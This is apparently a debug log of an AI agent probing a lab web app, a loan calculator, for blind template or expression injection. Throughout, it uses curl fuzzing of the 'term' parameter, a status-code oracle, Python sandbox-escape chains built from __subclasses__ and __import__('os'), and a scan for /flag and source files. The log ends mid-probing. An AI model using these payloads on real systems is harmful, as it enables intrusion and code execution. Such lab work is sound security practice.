@@ -1,0 +1,586 @@
+run: /tmp/ma-run
+[debug] [main] >>> Turn Started
+[debug] [telemetry] Model tokens: prompt=8352, completion=394
+[debug] [main] Tool Call: brief | target: -
+[debug] [main] Tool Result: brief (success=true) -> {"battlefield":"updated","recorded":true}
+[debug] [main] Tool Call: bash | target: curl -s -i --max-time 15 http://ssti_blind_loan_calculator:80/ | head -100
+[debug] [main] Tool Result: bash (success=true) -> HTTP/1.1 302 FOUND
+Date: Sun, 06 Sep 2026 08:01:27 GMT
+Server: Apache/2.4.67 (Debian)
+Content-Length: 199
+Location: /login
+Cache-Control: public, max-age=0
+Pragma: no-cache
+Expires: 0
+Content-Type: text/html; charset=utf-8
+
+<!doctype html>
+<html lang=en>
+<title>Redirecting...</title>
+<h1>Redirecting...</h1>
+<p>You should be redirected automatically to the target URL: <a href="/login">/lo... (truncated, total 433 bytes)
+[debug] [telemetry] Model tokens: prompt=8243, completion=49
+[debug] [main] Tool Call: bash | target: curl -s -i --max-time 15 http://ssti_blind_loan_calculator/login | head -120
+[debug] [main] Tool Result: bash (success=true) -> HTTP/1.1 200 OK
+Date: Sun, 06 Sep 2026 08:01:32 GMT
+Server: Apache/2.4.67 (Debian)
+Content-Length: 1642
+Cache-Control: public, max-age=0
+Pragma: no-cache
+Expires: 0
+Vary: Accept-Encoding
+Content-Type: text/html; charset=utf-8
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login</tit... (truncated, total 1879 bytes)
+[debug] [telemetry] Model tokens: prompt=8709, completion=68
+[debug] [main] Tool Call: bash | target: curl -s -i --max-time 15 -c /tmp/ck.txt -X POST -d 'username=test&password=test' http://ssti_blind_loan_calculator/login | head -40; echo "=== COOKIES ==="; ca…
+[debug] [main] Tool Result: bash (success=true) -> HTTP/1.1 302 FOUND
+Date: Sun, 06 Sep 2026 08:01:34 GMT
+Server: Apache/2.4.67 (Debian)
+Content-Length: 197
+Location: /home
+Cache-Control: public, max-age=0
+Pragma: no-cache
+Expires: 0
+Vary: Cookie
+Set-Cookie: session=eyJ1c2VyX2lkIjoxfQ.ap0d3g.YpBZnw9zlN3nKD2q_RQF9BEQEh4; HttpOnly; Path=/
+Content-Type: text/html; charset=utf-8
+
+<!doctype html>
+<html lang=en>
+<title>Redirecting...</title>... (truncated, total 799 bytes)
+[debug] [telemetry] Model tokens: prompt=9074, completion=41
+[debug] [main] Tool Call: bash | target: curl -s -i --max-time 15 -b /tmp/ck.txt http://ssti_blind_loan_calculator/home | head -200
+[debug] [main] Tool Result: bash (success=true) -> HTTP/1.1 200 OK
+Date: Sun, 06 Sep 2026 08:01:39 GMT
+Server: Apache/2.4.67 (Debian)
+Content-Length: 1388
+Cache-Control: public, max-age=0
+Pragma: no-cache
+Expires: 0
+Vary: Cookie,Accept-Encoding
+Content-Type: text/html; charset=utf-8
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hom... (truncated, total 1632 bytes)
+[debug] [telemetry] Model tokens: prompt=9529, completion=80
+[debug] [main] Tool Call: bash | target: echo "=== /profile ==="; curl -s -b /tmp/ck.txt --max-time 15 http://ssti_blind_loan_calculator/profile; echo; echo "=== /loan_details ==="; curl -s -b /tmp/ck…
+[debug] [main] Tool Result: bash (success=true) -> === /profile ===
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Profile</title>
+    <link href="/static/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="/static/css/style.css">
+</head>
+<body>
+    <div class="container">
+        <div class="row justify-content-between m... (truncated, total 5620 bytes)
+[debug] [telemetry] Model tokens: prompt=10873, completion=449
+[debug] [main] Tool Call: bash | target: cd /tmp # Probe 1: SSTI in profile 'name' field curl -s -o /dev/null -w "%{http_code}\n" -b /tmp/ck.txt --max-time 15 -X POST http://ssti_blind_loan_calculator…
+[debug] [main] Tool Result: bash (success=true) -> 302
+=== /home after inject ===
+                <h2>Welcome John Doe!</h2>
+=== /profile reflected ===
+                        <input type="text" class="form-control" id="name" name="name" value="{{7*7}}" required>
+                        <input type="text" class="form-control" id="lastname" name="lastname" value="Doe" required>
+                        <input type="email" class="form-control" id="em... (truncated, total 843 bytes)
+[debug] [telemetry] Model tokens: prompt=11299, completion=283
+[debug] [main] Tool Call: bash | target: cd /tmp echo "=== amortization term=60 ==="; curl -s -b /tmp/ck.txt --max-time 15 'http://ssti_blind_loan_calculator/amortization?term=60' | head -60 echo "===…
+[debug] [main] Tool Result: bash (success=true) -> === amortization term=60 ===
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Amortization Table</title>
+    <i>This feature is not yet fully implented.</i>
+    <style>
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 20px;
+        }... (truncated, total 1834 bytes)
+[debug] [telemetry] Model tokens: prompt=11891, completion=179
+[debug] [main] Tool Call: bash | target: cd /tmp for p in '{{7*7}}' '${7*7}' '%7*7%25' '{7*7}' '{{7*'\''7'\''}}' '60*'; do echo "--- term=$p" curl -s -o /dev/null -w "code=%{http_code} time=%{time_tot…
+[debug] [main] Tool Result: bash (success=true) -> --- term={{7*7}}
+code=400 time=0.004293
+--- term=${7*7}
+code=400 time=0.003464
+--- term=%7*7%25
+code=400 time=0.003133
+--- term={7*7}
+code=400 time=0.003386
+--- term={{7*'7'}}
+code=400 time=0.003834
+--- term=60*
+code=500 time=0.011146
+--- no term param
+code=500
+[debug] [telemetry] Model tokens: prompt=12195, completion=961
+[debug] [main] Tool Call: bash | target: cd /tmp echo "=== 500 body ==="; curl -s -b /tmp/ck.txt --max-time 15 'http://ssti_blind_loan_calculator/amortization?term=60*' | head -30 echo; echo "=== loan…
+[debug] [main] Tool Result: bash (success=true) -> === 500 body ===
+<!doctype html>
+<html lang=en>
+<title>500 Internal Server Error</title>
+<h1>Internal Server Error</h1>
+<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>
+
+=== loan_amount inject ===
+500
+                <p>Your loan principal is 10000.0</p>
+                <p>The term of y... (truncated, total 566 bytes)
+[debug] [telemetry] Model tokens: prompt=12553, completion=122
+[debug] [main] Tool Call: bash | target: cd /tmp for p in '60' '-1' '0' '60abc' ' 60' '60\n' "'60'" '"60"'; do echo -n "term=[$p] -> " curl -s -o /dev/null -w "code=%{http_code} time=%{time_total}\n" …
+[debug] [main] Tool Result: bash (success=true) -> term=[60] -> code=200 time=0.024407
+term=[-1] -> code=200 time=0.018270
+term=[0] -> code=200 time=0.007290
+term=[60abc] -> code=500 time=0.013204
+term=[ 60] -> code=200 time=0.007434
+term=[60\n] -> code=500 time=0.006918
+term=['60'] -> code=500 time=0.067263
+term=["60"] -> code=500 time=0.008747
+[debug] [telemetry] Model tokens: prompt=12814, completion=225
+[debug] [main] Tool Call: bash | target: cd /tmp # fingerprint: which operators survive the filter probe() { echo -n "term=[$1] -> "; curl -s -o /dev/null -w "code=%{http_code}\n" -b /tmp/ck.txt --max…
+[debug] [main] Tool Result: bash (success=true) -> term=[6+0] -> code=200
+term=[6-0] -> code=200
+term=[60 0] -> code=500
+term=[60%200] -> code=400
+term=[6*0] -> code=200
+term=[6%2B0] -> code=400
+term=[6%2D0] -> code=400
+term=[6*0] -> code=200
+term=[6/0] -> code=500
+term=[6//0] -> code=500
+term=[6|0] -> code=500
+term=[6&0] -> code=500
+term=[6^0] -> code=500
+term=[6%7] -> code=400
+term=[~6] -> code=500
+term=[6**0] -> code=200
+term=[60%2c60] -> code=... (truncated, total 524 bytes)
+[debug] [telemetry] Model tokens: prompt=13286, completion=3309
+[debug] [main] Tool Call: bash | target: cd /tmp rows() { curl -s -b /tmp/ck.txt --max-time 20 -G 'http://ssti_blind_loan_calculator/amortization' --data-urlencode "term=$1" | grep -c '<tr>'; } echo "…
+[debug] [main] Tool Result: bash (success=true) -> term=60 rows: 61
+term=6+0 rows: 7
+term=60-60 rows: 1
+term=2**3 rows: 9
+term=True rows: 2
+term=False rows: 1
+term=len('ab') rows: 0
+term=(60) rows: 61
+term=6_0 rows: 61
+term=int rows: 0
+term=__import__ rows: 0
+[debug] [telemetry] Model tokens: prompt=13607, completion=2421
+[debug] [main] Tool Call: bash | target: cd /tmp cat > probe.sh <<'EOF' #!/bin/bash p() { out=$(curl -s -w '\n%{http_code}' -b /tmp/ck.txt --max-time 25 -G 'http://ssti_blind_loan_calculator/amortizat…
+[debug] [main] Tool Result: bash (success=true) -> term=[int] code=500 rows=0
+term=[str] code=500 rows=0
+term=[list] code=500 rows=0
+term=[__import__] code=500 rows=0
+term=[foobarbaz] code=500 rows=0
+term=['60'] code=500 rows=0
+term=[60] code=200 rows=61
+term=[().__class__] code=500 rows=0
+term=[.__class__] code=500 rows=0
+term=[''.__class__] code=500 rows=0
+[debug] [telemetry] Model tokens: prompt=13928, completion=95
+[debug] [main] Tool Call: bash | target: cd /tmp; source probe.sh p 'True' p 'False' p 'None' p '1+1' p '9999999999999999999999' p '0x3C' p '0b1100' p '1_0' p 'inf' p 'nan' p '1e2' p '1_0.5' p '-1.5'
+[debug] [main] Tool Result: bash (success=true) -> term=[True] code=200 rows=2
+term=[False] code=200 rows=1
+term=[None] code=500 rows=0
+term=[1+1] code=200 rows=3
+term=[9999999999999999999999] code=000 rows=0
+term=[0x3C] code=000 rows=0
+term=[0b1100] code=000 rows=0
+term=[1_0] code=000 rows=0
+term=[inf] code=000 rows=0
+term=[nan] code=000 rows=0
+term=[1e2] code=000 rows=0
+term=[1_0.5] code=000 rows=0
+term=[-1.5] code=000 rows=0
+[debug] [telemetry] Model tokens: prompt=14196, completion=165
+[debug] [main] Tool Call: bash | target: cd /tmp echo -n "conn check: "; curl -s -o /dev/null -w "%{http_code}\n" -b /tmp/ck.txt --max-time 10 'http://ssti_blind_loan_calculator/home' for p in '2**3' …
+[debug] [main] Tool Result: bash (success=true) -> conn check: 000
+term=[2**3] -> code=000 time=30.001992 size=0
+term=[3+3] -> code=000 time=30.002605 size=0
+term=[9-1] -> code=200 time=7.351626 size=2057
+[debug] [telemetry] Model tokens: prompt=14436, completion=151
+[debug] [main] Tool Call: bash | target: cd /tmp echo -n "conn: "; curl -s -o /dev/null -w "%{http_code}\n" -b /tmp/ck.txt --max-time 10 'http://ssti_blind_loan_calculator/home' for i in 1 2 3; do ech…
+[debug] [main] Tool Result: bash (success=true) -> conn: 200
+attempt 1 term=6 -> code=200 time=0.004358
+attempt 2 term=6 -> code=200 time=0.004172
+attempt 3 term=6 -> code=200 time=0.004230
+[debug] [telemetry] Model tokens: prompt=14651, completion=52
+[debug] [main] Tool Call: bash | target: cd /tmp; source probe.sh p '2**3'; p '3+3'; p '9-1'; p '2**2'; p '5+1'; p '8'
+[debug] [main] Tool Result: bash (success=true) -> term=[2**3] code=200 rows=9
+term=[3+3] code=200 rows=7
+term=[9-1] code=200 rows=9
+term=[2**2] code=200 rows=5
+term=[5+1] code=200 rows=7
+term=[8] code=200 rows=9
+[debug] [telemetry] Model tokens: prompt=14783, completion=6767
+[debug] [main] Tool Call: bash | target: cd /tmp; source probe.sh echo "--- AST node probes ---" p '1<2'; p '1==1'; p '1!=2'; p '1 and 2'; p 'not 0'; p '-60'; p '1 if 1 else 0'; p '[1][0]'; p '[1]'; p…
+[debug] [main] Tool Result: bash (success=true) -> --- AST node probes ---
+term=[1<2] code=200 rows=2
+term=[1==1] code=200 rows=2
+term=[1!=2] code=200 rows=2
+term=[1 and 2] code=200 rows=3
+term=[not 0] code=200 rows=2
+term=[-60] code=200 rows=1
+term=[1 if 1 else 0] code=200 rows=2
+term=[[1][0]] code=200 rows=2
+term=[[1]] code=500 rows=0
+term=[6.0] code=500 rows=0
+term=[1<<3] code=500 rows=0
+term=[7/2] code=500 rows=0
+term=[7//2] code=200 rows=4
+te... (truncated, total 478 bytes)
+[debug] [telemetry] Model tokens: prompt=15119, completion=3369
+[debug] [main] Tool Call: bash | target: cd /tmp; source probe.sh p "'a'=='a'" p "''.__class__.__mro__[1].__name__=='object'" p '(1).__bit_length__()' p '[1,2,3][1:]==[2,3]' p '[1 for x in [1,2] if x]…
+[debug] [main] Tool Result: bash (success=true) -> term=['a'=='a'] code=200 rows=2
+term=[''.__class__.__mro__[1].__name__=='object'] code=200 rows=2
+term=[(1).__bit_length__()] code=500 rows=0
+term=[[1,2,3][1:]==[2,3]] code=200 rows=2
+term=[[1 for x in [1,2] if x]==[1,2]] code=500 rows=0
+term=[[1 for x in ''.__class__.__mro__[1].__subclasses__() if x.__name__=='os._wrap_close']==[1]] code=500 rows=0
+term=[[1 for x in ''.__class__.__mro__[1].__subc... (truncated, total 468 bytes)
+[debug] [telemetry] Model tokens: prompt=15498, completion=118
+[debug] [main] Tool Call: bash | target: cd /tmp; source probe.sh p '[1] and [2]' p '[1]==[1] if [1] else [0]' p 'not [1]' p 'True if [1]==[1] else False' p '[1,2,3].index(2)==1' p 'len' p '[1,2,3].__…
+[debug] [main] Tool Result: bash (success=true) -> term=[[1] and [2]] code=500 rows=0
+term=[[1]==[1] if [1] else [0]] code=200 rows=2
+term=[not [1]] code=200 rows=1
+term=[True if [1]==[1] else False] code=200 rows=2
+term=[[1,2,3].index(2)==1] code=200 rows=2
+term=[len] code=500 rows=0
+term=[[1,2,3].__len__()==3] code=200 rows=2
+term=['x'*0==''] code=200 rows=2
+term=[[1,1]==[1,1] and [1]==[1]] code=200 rows=2
+[debug] [telemetry] Model tokens: prompt=15782, completion=78
+[debug] [main] Tool Call: bash | target: cd /tmp; source probe.sh p '[1]==[1] and [1]==[1]' p '[1]==[2] and [1]==[1]' p '[1]==[1] and [1]==[2]' p '[1]==[1] if [1]==[2] else [0]'
+[debug] [main] Tool Result: bash (success=true) -> term=[[1]==[1] and [1]==[1]] code=200 rows=2
+term=[[1]==[2] and [1]==[1]] code=200 rows=1
+term=[[1]==[1] and [1]==[2]] code=200 rows=1
+term=[[1]==[1] if [1]==[2] else [0]] code=500 rows=0
+[debug] [telemetry] Model tokens: prompt=15952, completion=1383
+[debug] [main] Tool Call: bash | target: cd /tmp; source probe.sh p "'a'.upper()=='A'" p "'a'.__len__()==1" p "'a'.__class__==str" p "[].__class__==list" p "'a'.__doc__=='a'" p "'a'.__str__()=='a'" p …
+[debug] [main] Tool Result: bash (success=true) -> term=['a'.upper()=='A'] code=200 rows=2
+term=['a'.__len__()==1] code=200 rows=2
+term=['a'.__class__==str] code=200 rows=1
+term=[[].__class__==list] code=200 rows=1
+term=['a'.__doc__=='a'] code=200 rows=1
+term=['a'.__str__()=='a'] code=200 rows=2
+term=['a'.count('a')==1] code=200 rows=2
+term=['abc'[1:]==[1] or [0]==[0]] code=200 rows=2
+[debug] [telemetry] Model tokens: prompt=16200, completion=883
+[debug] [main] Tool Call: bash | target: cd /tmp; source probe.sh p "'a'.__class__==str" p "''.__class__==str" p "str==str" p "str==int" p "int==int" p "list==list" p "dict==dict" p "float==float" p "…
+[debug] [main] Tool Result: bash (success=true) -> term=['a'.__class__==str] code=200 rows=1
+term=[''.__class__==str] code=200 rows=1
+term=[str==str] code=200 rows=2
+term=[str==int] code=200 rows=2
+term=[int==int] code=200 rows=2
+term=[list==list] code=200 rows=2
+term=[dict==dict] code=200 rows=2
+term=[float==float] code=200 rows=2
+term=[bool==bool] code=200 rows=2
+term=[object==object] code=200 rows=2
+term=[str] code=500 rows=0
+term=[int] code=50... (truncated, total 409 bytes)
+[debug] [telemetry] Model tokens: prompt=16456, completion=109
+[debug] [main] Tool Call: bash | target: cd /tmp; source probe.sh p 'int==float' p 'int==list' p "'a'.__class__==''.__class__" p "'a'.__class__==().__class__" p "'a'.__class__==[].__class__" p "'a'.__…
+[debug] [main] Tool Result: bash (success=true) -> term=[int==float] code=200 rows=2
+term=[int==list] code=200 rows=2
+term=['a'.__class__==''.__class__] code=200 rows=2
+term=['a'.__class__==().__class__] code=200 rows=1
+term=['a'.__class__==[].__class__] code=200 rows=1
+term=['a'.__class__=={}.__class__] code=400 rows=0
+term=['a'.__class__==1.0.__class__] code=200 rows=1
+term=['a'.__class__==True.__class__] code=200 rows=1
+[debug] [telemetry] Model tokens: prompt=16716, completion=160
+[debug] [main] Tool Call: bash | target: cd /tmp; source probe.sh p "'a'.__class__==().__class__.__base__" p "'a'.__class__==().__class__.__mro__[1]" p "'a'.__class__==().__class__.__mro__[0]" p "'a'.…
+[debug] [main] Tool Result: bash (success=true) -> term=['a'.__class__==().__class__.__base__] code=200 rows=1
+term=['a'.__class__==().__class__.__mro__[1]] code=200 rows=1
+term=['a'.__class__==().__class__.__mro__[0]] code=200 rows=1
+term=['a'.__class__==[].__class__.__mro__[1]] code=200 rows=1
+term=['a'.__class__==().__class__.__bases__[0]] code=200 rows=1
+term=['a'.__class__==str or [1]==[1]] code=200 rows=2
+term=['a'.__class__==int or [1]==[1]... (truncated, total 528 bytes)
+[debug] [telemetry] Model tokens: prompt=17085, completion=3467
+[debug] [main] Tool Call: bash | target: cd /tmp; source probe.sh p '[1 for x in [1]]==[1]' p '[x for x in [1]]==[1]' p '6.0' p '6.5' p '1.5.__class__==1.5.__class__' p '{1}=={1}' p '{1:2}=={1:2}' p '…
+[debug] [main] Tool Result: bash (success=true) -> term=[[1 for x in [1]]==[1]] code=500 rows=0
+term=[[x for x in [1]]==[1]] code=500 rows=0
+term=[6.0] code=500 rows=0
+term=[6.5] code=500 rows=0
+term=[1.5.__class__==1.5.__class__] code=200 rows=2
+term=[{1}=={1}] code=400 rows=0
+term=[{1:2}=={1:2}] code=400 rows=0
+term=[(1,)==(1,)] code=200 rows=2
+term=['a'.__class__.__mro__[1].__subclasses__()==''.__class__.__mro__[1].__subclasses__()] code=200 ro... (truncated, total 405 bytes)
+[debug] [telemetry] Model tokens: prompt=17401, completion=144
+[debug] [main] Tool Call: bash | target: cd /tmp; source probe.sh p "'a'.__class__.__mro__[1].__subclasses__().__len__()==0" p "'a'.__class__.__mro__[1].__subclasses__().count(1)==0" p "'a'.__class__.…
+[debug] [main] Tool Result: bash (success=true) -> term=['a'.__class__.__mro__[1].__subclasses__().__len__()==0] code=200 rows=1
+term=['a'.__class__.__mro__[1].__subclasses__().count(1)==0] code=200 rows=2
+term=['a'.__class__.__mro__[1].__subclasses__()==[]] code=200 rows=1
+term=['a'.__class__.__mro__[1].__subclasses__()[-1]==1] code=200 rows=1
+term=['a'.__class__.__mro__[1].__subclasses__()[0]==1] code=200 rows=1
+term=['a'.__class__.__mro__[1].__... (truncated, total 440 bytes)
+[debug] [telemetry] Model tokens: prompt=17717, completion=669
+[debug] [main] Tool Call: bash | target: cd /tmp; source probe.sh p "__import__('os').name=='posix'" p "__import__('sys').platform" p "__import__('os')==str"
+[debug] [main] Tool Result: bash (success=true) -> term=[__import__('os').name=='posix'] code=500 rows=0
+term=[__import__('sys').platform] code=500 rows=0
+term=[__import__('os')==str] code=500 rows=0
+[debug] [telemetry] Model tokens: prompt=17838, completion=91
+[debug] [main] Tool Call: bash | target: cd /tmp; source probe.sh p "__import__" p "__import__('os')" p "__import__('os')=='os'" p "__import__('os').getcwd" p "'a'.__class__.__mro__[1].__subclasses__(…
+[debug] [main] Tool Result: bash (success=true) -> term=[__import__] code=500 rows=0
+term=[__import__('os')] code=500 rows=0
+term=[__import__('os')=='os'] code=500 rows=0
+term=[__import__('os').getcwd] code=500 rows=0
+term=['a'.__class__.__mro__[1].__subclasses__().__len__()==1] code=200 rows=1
+term=['a'.__class__.__mro__[1].__subclasses__().__len__()==2] code=200 rows=1
+[debug] [telemetry] Model tokens: prompt=18052, completion=255
+[debug] [main] Tool Call: bash | target: cd /tmp rm -f cookie.txt session.txt curl -s -i -c cookie.txt -X POST -d 'username=test&password=test' http://ssti_blind_loan_calculator/login -o /dev/null SES…
+[debug] [main] Tool Result: bash (success=true) -> session: eyJ1c2VyX2lkIjoxfQ.ap0iKA.CMAHP6TikYbuLhXXtu_EFLL8ULo
+term=60: 200
+term=int: 500
+both cookies term=int: 500
+[debug] [telemetry] Model tokens: prompt=18371, completion=219
+[debug] [main] Tool Call: bash | target: cd /tmp S=$(cat session.txt) probe() { curl -s -o /dev/null -w "code=%{http_code} time=%{time_total}\n" --max-time 60 -b "session=$S" -G 'http://ssti_blind_loa…
+[debug] [main] Tool Result: bash (success=true) -> 'a'+A:      code=500 time=0.008155
+A:          code=500 time=0.005942
+'a'.upper(): code=500 time=0.006091
+'a'.__class__: code=500 time=0.004949
+'a'=='a':   code=200 time=0.006428
+'a'=='b':   code=200 time=0.004589
+'a'=='A':   code=200 time=0.006180
+'a'==A:     code=200 time=0.006076
+[debug] [telemetry] Model tokens: prompt=18729, completion=685
+[debug] [main] Tool Call: bash | target: cd /tmp S=$(cat session.txt) p() { curl -s -o /dev/null -w "code=%{http_code}\n" --max-time 60 -b "session=$S" -G 'http://ssti_blind_loan_calculator/amortizati…
+[debug] [main] Tool Result: bash (success=true) -> [60] -> code=200
+[1+1] -> code=200
+[2**3] -> code=200
+['a'=='a'] -> code=200
+['a'.upper()=='A'] -> code=200
+['a'.__len__()==1] -> code=200
+['a'.count('a')==1] -> code=200
+['a'+A] -> code=500
+[A] -> code=500
+['a'+'b'] -> code=500
+[1<2] -> code=200
+[[1][0]==1] -> code=200
+['a'.__class__==().__class__] -> code=200
+[6.0] -> code=500
+[debug] [telemetry] Model tokens: prompt=19076, completion=262
+[debug] [main] Tool Call: bash | target: cd /tmp S=$(cat session.txt) p() { curl -s -o /dev/null -w "code=%{http_code}\n" --max-time 60 -b "session=$S" -G 'http://ssti_blind_loan_calculator/amortizati…
+[debug] [main] Tool Result: bash (success=true) -> extra=1 ->    code=200
+extra=A ->    code=200
+extra={{1}} -> code=200
+extra={{7*7}} -> code=200
+extra=' ->    code=200
+name=A ->     code=200
+name={{7*7}} -> code=200
+name='+A ->   code=200
+user=A ->     code=200
+user={{7*7}} -> code=200
+user='+A ->   code=200
+[debug] [telemetry] Model tokens: prompt=19443, completion=148
+[debug] [main] Tool Call: bash | target: cd /tmp S=$(cat session.txt) # several sequential probes on the same session to rule out global taint p() { echo -n "[$1] -> "; curl -s -o /dev/null -w "code=%…
+[debug] [main] Tool Result: bash (success=true) -> [60] -> code=200
+['a'.upper()] -> code=500
+[60] -> code=200
+['a'+A] -> code=500
+[60] -> code=200
+[A] -> code=500
+[60] -> code=200
+['a'.upper()=='A'] -> code=200
+[60] -> code=200
+[debug] [telemetry] Model tokens: prompt=19675, completion=250
+[debug] [main] Tool Call: bash | target: cd /tmp S=$(cat session.txt) p() { curl -s -o /dev/null -w "code=%{http_code}\n" --max-time 60 -b "session=$S" -G 'http://ssti_blind_loan_calculator/amortizati…
+[debug] [main] Tool Result: bash (success=true) -> --- NameError probes (true NameErrors, nothing undefined) ---
+foo → code=500
+bar → code=500
+A → code=500
+'a'+A → code=500
+--- full escape equivalents ---
+''.__class__.__mro__ → code=500
+().__class__.__base__ → code=500
+'a'.__class__==().__class__ → code=200
+'a'.__class__==().__class__.__base__ → code=200
+[debug] [telemetry] Model tokens: prompt=20025, completion=136
+[debug] [main] Tool Call: bash | target: cd /tmp; source probe.sh echo -n "[2/1] -> "; p "2/1" echo -n "[2*0.5] -> "; p "2*0.5" echo -n "[-1.5] -> "; p "-1.5" echo -n "[7//2] -> "; p "7//2" echo -n "[…
+[debug] [main] Tool Result: bash (success=true) -> [2/1] -> term=[2/1] code=500 rows=0
+[2*0.5] -> term=[2*0.5] code=500 rows=0
+[-1.5] -> term=[-1.5] code=500 rows=0
+[7//2] -> term=[7//2] code=200 rows=4
+[7%2] -> term=[7%2] code=400 rows=0
+['x'*0==''] -> term=['x'*0==''] code=200 rows=2
+[-60] -> term=[-60] code=200 rows=1
+[debug] [telemetry] Model tokens: prompt=20302, completion=2482
+[debug] [main] Tool Call: bash | target: cd /tmp; source probe.sh echo "--- string equality sanity: actual bodies ---" for t in "'a'=='a'" "'a'=='b'" "'ab'[0]=='b'" "'ab'[1]=='b'" "'ab'[0:1]=='a'" "'a…
+[debug] [main] Tool Result: bash (success=false) -> --- string equality sanity: actual bodies ---
+term=['a'=='a'] code=200 rows=2
+term=['a'=='b'] code=200 rows=1
+term=['ab'[0]=='b'] code=200 rows=1
+term=['ab'[1]=='b'] code=200 rows=2
+term=['ab'[0:1]=='a'] code=200 rows=2
+term=['ab'.count('a')==1] code=200 rows=2
+--- body of 'ab'[1]=='b' ---
+                    <td>1</td>
+                    <td>N/A</td>
+                    <td>N/A</td>... (truncated, total 452 bytes)
+[debug] [telemetry] Model tokens: prompt=20671, completion=281
+[debug] [main] Tool Call: bash | target: cd /tmp # how long does the oracle hold on a session? S=$(cat session.txt) p() { curl -s -o /dev/null -w "code=%{http_code}\n" --max-time 60 -b "session=$S" -G…
+[debug] [main] Tool Result: bash (success=true) -> t0 'a'=='a': code=200
+t0 int:      code=500
+t30 'a'=='a': code=200
+t90 'a'=='a': code=200
+t150 'a'=='a': code=200
+t210 'a'=='a': code=200
+[debug] [telemetry] Model tokens: prompt=21025, completion=325
+[debug] [main] Tool Call: bash | target: cd /tmp S=$(cat session.txt) curl -s -o /dev/null -w "no-b term=60: %{http_code}\n" --max-time 20 'http://ssti_blind_loan_calculator/amortization?term=60' curl…
+[debug] [main] Tool Result: bash (success=true) -> no-b term=60: 200
+no-b term=int: 500
+bad session code=200
+logout check: 302
+fresh S2 term=int: 500
+[debug] [telemetry] Model tokens: prompt=21393, completion=245
+[debug] [main] Tool Call: bash | target: cd /tmp # header hunt + method probes curl -s -D- -o /dev/null --max-time 20 'http://ssti_blind_loan_calculator/amortization?term=60' | grep -iE 'x-|err|flask|…
+[debug] [main] Tool Result: bash (success=true) -> Server: Apache/2.4.67 (Debian)
+Cache-Control: public, max-age=0
+--- methods on /amortization ---
+POST: 405
+PUT: 405
+DELETE: 405
+OPTIONS: 200
+PATCH: 405
+--- other suspicious paths (no auth) ---
+/debug: 404
+/console: 404
+/admin: 404
+/flag: 404
+/flag.txt: 404
+/robots.txt: 404
+/sitemap.xml: 404
+/.git/HEAD: 404
+/app.py: 404
+/main.py: 404
+/application.py: 404
+/source.zip: 404
+/backups/: 404
+/static/js... (truncated, total 459 bytes)
+[debug] [telemetry] Model tokens: prompt=21837, completion=210
+[debug] [main] Tool Call: bash | target: cd /tmp S=$(cat session.txt) # decouple template failure from expression failure: nesting depth and payload size p() { curl -s -o /dev/null -w "code=%{http_cod…
+[debug] [main] Tool Result: bash (success=true) -> deep parens:      code=200
+big expr (1000x): code=500
+big parens:       code=500
+deep mro chain:   code=500
+tiny:             code=200
+[debug] [telemetry] Model tokens: prompt=22097, completion=140
+[debug] [main] Tool Call: bash | target: cd /tmp S=$(cat session.txt) p() { curl -s -o /dev/null -w "code=%{http_code}\n" --max-time 30 -b "session=$S" -G 'http://ssti_blind_loan_calculator/amortizati…
+[debug] [main] Tool Result: bash (success=true) -> sum of 1 ones -> code=200
+sum of 5 ones -> code=200
+sum of 10 ones -> code=200
+sum of 20 ones -> code=200
+sum of 30 ones -> code=200
+sum of 40 ones -> code=200
+sum of 60 ones -> code=200
+sum of 80 ones -> code=200
+sum of 100 ones -> code=200
+[debug] [telemetry] Model tokens: prompt=22331, completion=255
+[debug] [main] Tool Call: bash | target: cd /tmp S=$(cat session.txt) p() { curl -s -o /dev/null -w "code=%{http_code}\n" --max-time 30 -b "session=$S" -G 'http://ssti_blind_loan_calculator/amortizati…
+[debug] [main] Tool Result: bash (success=true) -> big int literal (1000 ones): code=000
+sum of 500 ones:             code=500
+50-paren nest:               code=200
+60-char dots:                code=500
+10-char dots:                code=500
+plain dots-free junk:        code=500
+[debug] [telemetry] Model tokens: prompt=22651, completion=268
+[debug] [main] Tool Call: bash | target: cd /tmp S=$(cat session.txt) p() { curl -s -o /dev/null -w "code=%{http_code}\n" --max-time 40 -b "session=$S" -G 'http://ssti_blind_loan_calculator/amortizati…
+[debug] [main] Tool Result: bash (success=true) -> 100-char junk:   code=500
+200-char junk:   code=500
+400-char junk:   code=500
+500-char junk:   code=500
+500x '1+':       code=500
+1000x '1+':      code=500
+500-deep parens: code=500
+[debug] [telemetry] Model tokens: prompt=22992, completion=189
+[debug] [main] Tool Call: bash | target: cd /tmp S=$(cat session.txt) p() { curl -s -o /dev/null -w "code=%{http_code}\n" --max-time 40 -b "session=$S" -G 'http://ssti_blind_loan_calculator/amortizati…
+[debug] [main] Tool Result: bash (success=true) -> junk x150: code=500
+junk x200: code=500
+junk x250: code=500
+junk x300: code=500
+junk x350: code=500
+junk x400: code=500
+junk x450: code=500
+---
+sum of 40 ones: code=200
+sum of 60 ones: code=200
+sum of 80 ones: code=200
+sum of 90 ones: code=200
+sum of 100 ones: code=200
+sum of 120 ones: code=200
+sum of 140 ones: code=200
+sum of 160 ones: code=200
+[debug] [telemetry] Model tokens: prompt=23329, completion=68
+[debug] [main] Tool Call: bash | target: cd /tmp; source probe.sh p "'x'*1=='x'" p "'x'*200=='x'*200" p "'x'*100=='x'" p "'x'*1000=='x'" p "'x'*100=='x'*100 and 1==1"
+[debug] [main] Tool Result: bash (success=true) -> term=['x'*1=='x'] code=200 rows=2
+term=['x'*200=='x'*200] code=200 rows=2
+term=['x'*100=='x'] code=200 rows=1
+term=['x'*1000=='x'] code=200 rows=1
+term=['x'*100=='x'*100 and 1==1] code=200 rows=2
+[debug] [telemetry] Model tokens: prompt=23486, completion=72
